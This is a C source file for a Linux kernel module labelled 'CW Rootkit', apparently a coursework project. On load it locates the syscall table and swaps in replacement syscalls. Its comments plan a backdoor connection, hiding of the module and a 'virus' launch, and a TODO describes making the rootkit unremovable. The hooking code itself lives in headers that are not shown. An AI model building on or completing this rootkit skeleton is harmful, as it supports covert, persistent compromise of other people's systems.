#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/cred.h>

#include "rootkit_main.h"
#include "modify_syscalls.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Finn_Adam_Charlie");
MODULE_DESCRIPTION("CW Rootkit");
MODULE_VERSION("0.0.1");

void **sys_call_table;
struct sysinfo *info;

static int __init lkm_example_init(void) {
    //finding syscall table
    sys_call_table = find_syscall_table();
    //re-place syscalls with our own
    update_sys_calls(sys_call_table);

    //create backdoor connection
        //launch backdoor

    //Hide rootkit and launch virus stuff (UNCOMMENT FOR AUTOMATION OF THIS)
    //hide();
    //launch virus

    return 0;
}

static void __exit lkm_example_exit(void) {
    //re-load original syscalls
    revert_to_original(sys_call_table);
}



module_init(lkm_example_init);
//TODO Comment this line out to make it so the rootkit can't be removed
module_exit(lkm_example_exit);
